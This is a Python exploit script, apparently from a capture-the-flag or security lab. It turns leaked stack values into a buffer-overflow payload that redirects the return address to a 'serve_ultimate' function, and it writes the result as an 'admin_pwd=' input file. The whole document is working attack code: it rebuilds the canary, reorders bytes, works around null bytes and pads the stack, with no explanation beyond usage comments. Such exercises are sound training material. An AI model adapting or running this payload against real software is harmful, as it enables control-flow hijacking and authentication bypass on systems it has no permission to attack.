
# Usage: python3 ./a.out <1 for hardcoded values, 0 for dynamic> <serve_ultimate_offset> <stack_offeset>
# IMPORTANT: both offsets need to be positive or 0, the script will do the rest

import sys

# hardcoded_values = [ '01b1b200', '56559f10', 'f7ffb000', 'ffffce18', '565569ab' ]

hardcoded = False
hardcoded_values = [ '6d072d00', 'ffffffff', 'ffffffff', 'ffff9588', '565fa015' ]
hardcoded_base_param_arg = hardcoded_values[-2]

def substitute_null_bytes(word):
    dangerous = []
    prev = '1'
    for i in range(0, len(word)):
        if i % 2 == 1 and word[i] == '0' and prev == '0':
            dangerous.append( i-1 )
            prev = '1'
        else:
            prev = word[i]


    neww = list(word)
    for i in dangerous:
        neww[i] = '2'
        neww[i+1] = '6'  # 0x26 == '&'
    
    s = ''
    for i in neww:
        s += i
    return s


def reverse_byte_order(word):
    lbytes = [word[i:i+2] for i in range(0, len(word), 2)][::-1]
    nword = ''
    for i in lbytes:
        nword += i
    return nword


def main():

    if (int(sys.argv[1]) == 1):
        hardcoded = True
    else:
        hardcoded = False

    offset_ultimate = int(sys.argv[2])
    offset_stack = int(sys.argv[3])

    # dummy_chars = int(sys.argv[2])
    
    if not hardcoded:
        response = input().split()[-6:-1]
        base_param = response[-2]
    else:
        response = hardcoded_values
        base_param = hardcoded_base_param_arg

    print(response)
    

    ret_addr = int(response[-1], 16) + offset_ultimate
    response[-1] = hex(ret_addr)[2:]
    print(response)


    sys.stderr.write('Core payload generated is: ' + "".join(response))


    nw = []
    for word in response:
        word = reverse_byte_order(word)
        word = substitute_null_bytes(word)
        nw.append( bytes.fromhex(word) )

    print(nw)


    base_param_arg = int(base_param, 16) - offset_stack  # !

    param_arg = hex(base_param_arg)[2:]
    print('Stack: ', param_arg)

    param_arg = reverse_byte_order(param_arg)
    param_arg = substitute_null_bytes(param_arg)
    hex_param_arg = bytes.fromhex(param_arg)


    load = b''
    for i in nw:
        load += i

    payload = 2 * b'\xBB' +  12 * hex_param_arg + load
    print(payload)

    # with open("payload.bin", "wb") as f:
        # f.write(payload)

    with open("full_payload.bin", "wb") as f:
        f.write( b'admin_pwd=' +  payload )

if __name__ == '__main__':
    main()